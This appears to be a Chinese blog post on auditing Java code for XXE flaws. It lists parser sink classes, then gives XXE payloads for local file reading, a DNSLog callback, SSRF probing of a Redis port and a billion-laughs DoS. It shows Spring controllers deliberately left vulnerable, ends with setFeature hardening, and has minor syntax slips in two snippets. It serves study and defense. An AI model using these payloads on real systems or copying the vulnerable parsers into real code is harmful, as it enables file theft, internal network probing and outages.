---
title: XXE
date: 2025-08-30 17:17:04
updated: 2026-01-27 07:24:27
tags:
  - Web
  - java
  - 代码审计
---
# 审计函数

```java
XMLReaderFactory
createXMLReader
SAXBuilder
SAXReader
SAXParserFactory
newSAXParser
Digester
DocumentBuilderFactory
DocumentBuilder
XMLReader
DocumentHelper
XMLStreamReader
SAXParser
SAXSource
TransformerFactory
SAXTransformerFactory
SchemaFactory
Unmarshaller
XPathExpression
javax.xml.parsers.DocumentBuilder
javax.xml.parsers.DocumentBuilderFactory
javax.xml.stream.XMLStreamReader
javax.xml.stream.XMLInputFactory
org.jdom.input.SAXBuilder
org.jdom2.input.SAXBuilder
org.jdom.output.XMLOutputter
oracle.xml.parser.v2.XMLParser
javax.xml.parsers.SAXParser
org.dom4j.io.SAXReader
org.dom4j.DocumentHelper
org.xml.sax.XMLReader
javax.xml.transform.sax.SAXSource
javax.xml.transform.TransformerFactory
javax.xml.transform.sax.SAXTransformerFactory
javax.xml.validation.SchemaFactory
javax.xml.validation.Validator
javax.xml.bind.Unmarshaller
javax.xml.xpath.XPathExpression
java.beans.XMLDecoder
org.xml.sax.EntityResolver
org.dom4j.*
XMLInputFactory
DocumentBuilderFactoryImpl
Xerces: DOMParser, DOMParserImpl, SAXParser, XMLParser
```

# XXE Payloads

[https://github.com/payloadbox/xxe-injection-payload-list](https://github.com/payloadbox/xxe-injection-payload-list)

## 读取本地任意文件

Windows 系统读取文件需要 file:///C:/（带着盘符）

Linux/Unix系统读取文件需要 file:///

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY file SYSTEM "file:///C:/Users/powerful/Desktop/test.txt">
]>
<root>&file;</root>
```

## 请求 DNSLog

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY file SYSTEM "https://dnslog地址">
]>
<root>&file;</root>
```

## SSRF 探测内网

可通过时间响应差异等情况探测内网IP，以及端口开放情况。

如果内网存在redis未授权，可以尝试进行组合攻击。

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY file SYSTEM "http://127.0.0.1:6379">
]>
<root>&file;</root>
```

## DoS 攻击

通过不断迭代增大变量的空间，进而导致内存崩溃。

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE lolz [<!ENTITY lol "lol"><!ELEMENT lolz (#PCDATA)>
<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;
<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
<tag>&lol9;</tag>
```

# 常见的 XML 解析器

## DOM 解析

> DOM的全称是Document Object Model，也即文档对象模型。DOM 解析是将一个 XML 文档转换成一个 DOM 树，并将 DOM 树放在内存中。
> 
> 使用大致步骤：
> 
> 1.  创建一个 DocumentBuilderFactory 对象
> 2.  创建一个 DocumentBuilder 对象
> 3.  通过 DocumentBuilder 的 parse() 方法加载 XML
> 4.  遍历 name 和 value 节点

```java
package com.example.xxedemo;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.w3c.dom.Document;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;
import org.xml.sax.InputSource;
import javax.servlet.http.HttpServletRequest;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import java.io.InputStream;
import java.io.StringReader;
/**
* 编号7089
*/
@RestController
public class DOMTest {
    @RequestMapping("/domdemo/vul")
    public String domDemo(HttpServletRequest request){
        try {
            //获取输入流
            InputStream in = request.getInputStream();
            String body = convertStreamToString(in);
            StringReader sr = new StringReader(body);
            InputSource is = new InputSource(sr);
            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
            DocumentBuilder db = dbf.newDocumentBuilder();
            Document document = db.parse(is);
            // 遍历xml节点name和value
            StringBuilder buf = new StringBuilder();
            NodeList rootNodeList = document.getChildNodes();
            for (int i = 0; i < rootNodeList.getLength(); i++) {
                Node rootNode = rootNodeList.item(i);
                NodeList child = rootNode.getChildNodes();
                for (int j = 0; j < child.getLength(); j++) {
                    Node node = child.item(j);
                    buf.append(String.format("%s: %s\n", node.getNodeName(),node.getTextContent()));
                }
            }
            sr.close();
            return buf.toString();
        } catch (Exception e) {
            return "EXCEPT ERROR!!!";
        }
    }
    public static String convertStreamToString(java.io.InputStream is) {
        java.util.Scanner s = new java.util.Scanner(is).useDelimiter("\\A");
        return s.hasNext() ? s.next() : "";
    }
}
```

## SAX 解析

> SAX 的全称是 Simple APIs for XML，也即 XML 简单应用程序接口。与 DOM 不同，SAX 提供的访问模式是一种顺序模式，这是一种快速读写 XML 数据的方式。
> 
> 使用大致步骤：
> 
> 1.  获取 SAXParserFactory 的实例
> 2.  获取 SAXParser 实例
> 3.  创建一个 handler() 对象
> 4.  通过 parser 的 parse() 方法来解析 XML

```java
package com.example.xxedemo;
import com.sun.org.apache.xml.internal.resolver.readers.SAXParserHandler;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.xml.sax.InputSource;
import javax.servlet.http.HttpServletRequest;
import javax.xml.parsers.SAXParser;
import javax.xml.parsers.SAXParserFactory;
import java.io.IOException;
import java.io.InputStream;
import java.io.StringReader;
/**
* 编号7089
*/
@RestController
public class SAXTest {
    @RequestMapping("/saxdemo/vul")
    public String saxDemo(HttpServletRequest request) throws IOException {
        //获取输入流
        InputStream in = request.getInputStream();
        String body = convertStreamToString(in);
        try {
            SAXParserFactory spf = SAXParserFactory.newInstance();
            SAXParser parser = spf.newSAXParser();
            SAXParserHandler handler = new SAXParserHandler();
            //解析xml
            parser.parse(new InputSource(new StringReader(body)), handler);
            return "Sax xxe vuln code";
        } catch (Exception e) {
            return "Error......";
        }
    }
    public static String convertStreamToString(java.io.InputStream is) {
        java.util.Scanner s = new java.util.Scanner(is).useDelimiter("\\A");
        return s.hasNext() ? s.next() : "";
    }
}
```

## JDOM 解析

> JDOM 是一个开源项目，它基于树型结构，利用纯 JAVA 的技术对 XML 文档实现解析、成、序列化以及多种操作。
> 
> 使用大致步骤：
> 
> 1.  创建一个 SAXBuilder 的对象
> 2.  通过 saxBuilder 的 build()方法，将入流加载到 saxBuilder 中

```xml
<dependency>
  <groupId>org.jdom</groupId>
  <artifactId>jdom</artifactId>
  <version>1.1.3</version>
</dependency>
```
```java
package com.example.xxedemo;
import org.jdom.input.SAXBuilder;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.xml.sax.InputSource;
import javax.servlet.http.HttpServletRequest;
import java.io.IOException;
import java.io.InputStream;
import java.io.StringReader;
/**
*/
* 编号7089
@RestController
public class JDOMTest {
    @RequestMapping("/jdomdemo/vul")
    public String jdomDemo(HttpServletRequest request) throws IOException {
        //获取输入流
        InputStream in = request.getInputStream();
        String body = convertStreamToString(in);
        try {
            SAXBuilder builder = new SAXBuilder();
            builder.build(new InputSource(new StringReader(body)));
            return "jdom xxe vuln code";
        } catch (Exception e) {
            return "Error......";
        }
    }
    public static String convertStreamToString(java.io.InputStream is) {
        java.util.Scanner s = new java.util.Scanner(is).useDelimiter("\\A");
        return s.hasNext() ? s.next() : "";
    }
}
```

## DOM4J 解析

> Dom4j 是一个易用的、开源的库，用于XML，XPath 和 XSLT。它应用于Java平台，采用了Java集合框架并完全支持 DOM，SAX 和 JAXP。是 Jdom 的升级品
> 
> 使用大致步骤：
> 
> 1.  创建 SAXReader 的对象 reader
> 2.  通过 reader 对象的 read() 方法加载 xml 文件

```xml
<dependency>
  <groupId>dom4j</groupId>
  <artifactId>dom4j</artifactId>
  <version>1.6.1</version>
</dependency>
```
```java
package com.example.xxedemo;
import org.dom4j.io.SAXReader;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.xml.sax.InputSource;
import javax.servlet.http.HttpServletRequest;
import java.io.InputStream;
import java.io.StringReader;
/**
* 编号7089
*/
@RestController
public class DOM4JTest {
    @RequestMapping("/dom4jdemo/vul")
    public String dom4jDemo(HttpServletRequest request) {
        try {
            //获取输入流
            InputStream in = request.getInputStream();
            String body = convertStreamToString(in);
            SAXReader reader = new SAXReader();
            reader.read(new InputSource(new StringReader(body)));
            return "DOM4J XXE......";
        } catch (Exception e) {
            return "EXCEPT ERROR!!!";
        }
    }
    public static String convertStreamToString(java.io.InputStream is) {
        java.util.Scanner s = new java.util.Scanner(is).useDelimiter("\\A");
        return s.hasNext() ? s.next() : "";
    }
}
```

## Digester 解析

> Digester 是 Apache 下一款开源项目。 目前最新版本为 Digester 3.x 。
> 
> Digester 是对 SAX 的包装，底层是采用的是 SAX 解析方式。
> 
> 使用大致步骤：
> 
> 1.  创建 Digester 对象
> 2.  调用 Digester 对象的 parse() 解析 XML

```xml
<dependency>
  <groupId>commons-digester</groupId>
  <artifactId>commons-digester</artifactId>
  <version>2.1</version>
</dependency>
```
```java
package com.example.xxedemo;
import org.apache.commons.digester.Digester;
import org.dom4j.io.SAXReader;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.xml.sax.InputSource;
import javax.servlet.http.HttpServletRequest;
import java.io.InputStream;
import java.io.StringReader;
@RestController
public class DigesterTest {
    @RequestMapping("/digesterdemo/vul")
    public String digesterDemo(HttpServletRequest request) {
        try {
            //获取输入流
            InputStream in = request.getInputStream();
            String body = convertStreamToString(in);
            Digester digester = new Digester();
            digester.parse(new StringReader(body));
            return "Digester XXE......";
        } catch (Exception e) {
            return "EXCEPT ERROR!!!";
        }
    }
    public static String convertStreamToString(java.io.InputStream is) {
        java.util.Scanner s = new java.util.Scanner(is).useDelimiter("\\A");
        return s.hasNext() ? s.next() : "";
    }
}
```

# 防御

[GitHub - LeadroyaL/java-xxe-defense-demo: java xxe defense demo](https://github.com/LeadroyaL/java-xxe-defense-demo)

目前常用的修复方案为 setFeature。设置 setFeature 打开或关闭一些配置，进而防御 XXE 攻击。

```java
@RequestMapping(value = "/Digester/sec", method = RequestMethod.POST)
public String DigesterSec(HttpServletRequest request) {
    try {
        String body = WebUtils.getRequestBody(request);
        logger.info(body);
        Digester digester = new Digester();
        digester.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
        digester.setFeature("http://xml.org/sax/features/external-general-entities", false);
        digester.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
        digester.parse(new StringReader(body)); // parse xml
        return "Digester xxe security code";
    } catch (Exception e) {
        logger.error(e.toString());
        return EXCEPT;
    }
}
```

在Java的 DocumentBuilderFactory中， setFeature方法用于启用或禁用特定的XML解析器特性。这些特性通常以URI的形式表示，并且它们定义了解析器的行为。以下是一些常见的特性及其含义：

1.  “http://apache.org/xml/features/disallow-doctype-decl”:设置为 true时，这个特性会禁止使用DOCTYPE声明，从而防止DOCTYPE相关的XXE攻击。
2.  “http://xml.org/sax/features/external-general-entities”:  
    设置为 false时，这个特性会禁止解析外部通用实体，从而防止通过外部实体进行的XXE攻击。
3.  “http://xml.org/sax/features/external-parameter-entities”:  
    设置为 false时，这个特性会禁止解析外部参数实体，这也是防止XXE攻击的一种措施。
4.  “http://apache.org/xml/features/nonvalidating/load-external-dtd”:  
    设置为 false时，这个特性会禁止加载外部DTD（文档类型定义），这可以防止某些类型的XXE攻击，因为外部DTD可能会包含恶意的外部实体引用。
5.  “http://xml.org/sax/features/xinclude”:  
    设置为 false时，这个特性会禁止使用XInclude处理，XInclude是一种在XML文档中包含其他XML内容的功能，如果不小心处理，也可能成为XXE攻击的途径。
6.  “http://apache.org/xml/features/dom/defer-node-expansion”:  
    这个特性与DOM解析相关，设置为 true时，它会延迟节点扩展，直到实际访问节点，这可以提高解析大量数据的性能。

这些特性的设置是为了增强XML解析的安全性，防止恶意用户通过XML文档执行不期望的操作，如访问敏感文件、执行远程代码等。在实际应用中，应该据应用程序的具体需求和安全要求来决定启用或禁用哪些特性。

# 其他

[https://xz.aliyun.com/news/2994](https://xz.aliyun.com/news/2994)

[https://blog.spoock.com/2018/10/23/java-xxe/](https://blog.spoock.com/2018/10/23/java-xxe/)

[https://yoga7xm.top/2020/02/17/javaxxe/](https://yoga7xm.top/2020/02/17/javaxxe/)

[JAVA XXE中两种数据传输形式及相关限制](https://kylingit.com/blog/java-xxe%E4%B8%AD%E4%B8%A4%E7%A7%8D%E6%95%B0%E6%8D%AE%E4%BC%A0%E8%BE%93%E5%BD%A2%E5%BC%8F%E5%8F%8A%E7%9B%B8%E5%85%B3%E9%99%90%E5%88%B6/)